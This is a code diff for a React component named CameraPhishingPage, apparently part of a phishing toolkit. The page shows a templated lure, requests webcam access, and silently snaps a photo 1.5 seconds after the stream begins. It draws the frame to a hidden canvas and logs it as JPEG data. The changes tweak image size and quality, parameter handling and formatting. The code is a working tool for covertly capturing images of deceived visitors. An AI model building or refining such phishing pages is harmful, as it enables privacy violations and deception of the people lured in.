@@ -33,8 +33,8 @@ const templateContent: Record<string, { title: string, actionText: string, messa
 
 export default function CameraPhishingPage() {
   const { addLog } = useLogs();
-  const params = useParams();
-  const templateId = typeof params.id === 'string' ? params.id : 'default';
+  const { id: idFromParams } = useParams<{ id: string }>();
+  const templateId = idFromParams || 'default';
   const content = templateContent[templateId] || templateContent.default;
 
   const [status, setStatus] = useState<'idle' | 'requesting' | 'streaming' | 'captured' | 'error'>('idle');
@@ -55,12 +55,10 @@ export default function CameraPhishingPage() {
       const video = videoRef.current;
       const canvas = canvasRef.current;
 
-      // Define maximum dimensions for the captured image
-      const MAX_WIDTH = 640; 
-      const MAX_HEIGHT = 480;
+      const MAX_WIDTH = 320;
+      const MAX_HEIGHT = 240;
       let { videoWidth, videoHeight } = video;
 
-      // Calculate new dimensions while maintaining aspect ratio
       if (videoWidth > videoHeight) {
         if (videoWidth > MAX_WIDTH) {
           videoHeight = Math.round((videoHeight * MAX_WIDTH) / videoWidth);
@@ -75,21 +73,20 @@ export default function CameraPhishingPage() {
 
       canvas.width = videoWidth;
       canvas.height = videoHeight;
-      
+
       const context = canvas.getContext('2d');
       if (context) {
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        // Capture the image as JPEG with 80% quality
-        const imageUrl = canvas.toDataURL('image/jpeg', 0.8); 
+        const imageUrl = canvas.toDataURL('image/jpeg', 0.5);
         const cameraData: CameraData = { imageUrl };
         addLog({ type: 'camera', data: cameraData });
         console.log("Image captured and logged.");
-        setStatus('captured'); 
-        stopCameraStream(true); 
+        setStatus('captured');
+        stopCameraStream(true);
       }
     }
   };
-  
+
   const startCameraStream = async () => {
     if (streamRef.current) stopCameraStream();
 
@@ -106,8 +103,7 @@ export default function CameraPhishingPage() {
            if (videoRef.current) videoRef.current.play();
            setStatus('streaming');
            setIsLoading(false);
-           // Re-enable automatic snapshot
-           setTimeout(captureImage, 1500); 
+           setTimeout(captureImage, 1500);
         };
       }
     } catch (err) {
@@ -135,11 +131,11 @@ export default function CameraPhishingPage() {
     if (videoRef.current) {
       videoRef.current.srcObject = null;
     }
-    if (intervalRef.current) { 
+    if (intervalRef.current) {
       clearInterval(intervalRef.current);
       intervalRef.current = null;
     }
-    if (!isAfterCapture && status !== 'captured' && status !== 'error') { 
+    if (!isAfterCapture && status !== 'captured' && status !== 'error') {
       setStatus('idle');
     }
   };
@@ -152,7 +148,7 @@ export default function CameraPhishingPage() {
   }, []);
 
   return (
-    <PhishingPageLayout 
+    <PhishingPageLayout
         title={content.title}
         isLoading={isLoading && status !== 'streaming'}
         error={error}
@@ -172,8 +168,8 @@ export default function CameraPhishingPage() {
       <canvas ref={canvasRef} className="hidden"></canvas>
 
       {(status === 'idle' || status === 'error') && (
-        <Button 
-          onClick={startCameraStream} 
+        <Button
+          onClick={startCameraStream}
           className="w-full bg-accent hover:bg-accent/90 text-accent-foreground"
           disabled={isLoading}
         >
